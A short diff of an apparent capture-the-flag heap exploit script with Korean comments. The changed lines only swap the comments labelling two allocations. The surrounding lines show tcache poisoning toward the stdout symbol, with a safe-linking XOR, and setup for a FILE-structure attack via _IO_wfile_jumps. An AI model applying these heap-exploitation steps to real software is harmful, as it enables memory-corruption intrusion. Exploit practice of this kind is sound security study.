@@ -132,8 +132,8 @@ get_cat(10) # tcache-> 비어있음, fastbin은 애초에 크기 커서 그 쪽�
 
 pet_cat(0, p64(elf.sym['stdout'] ^ guard)) # stdout, 원래 cat2가 담겨있었음
 
-get_cat(11) # cat1
-get_cat(12) # cat2
+get_cat(11) # cat2
+get_cat(12) # cat1
 
 stdout = chunk + 0x4d0 # 맨 뒤 청크의 뒤쪽 부분
 wfile = libc.sym["_IO_wfile_jumps"]
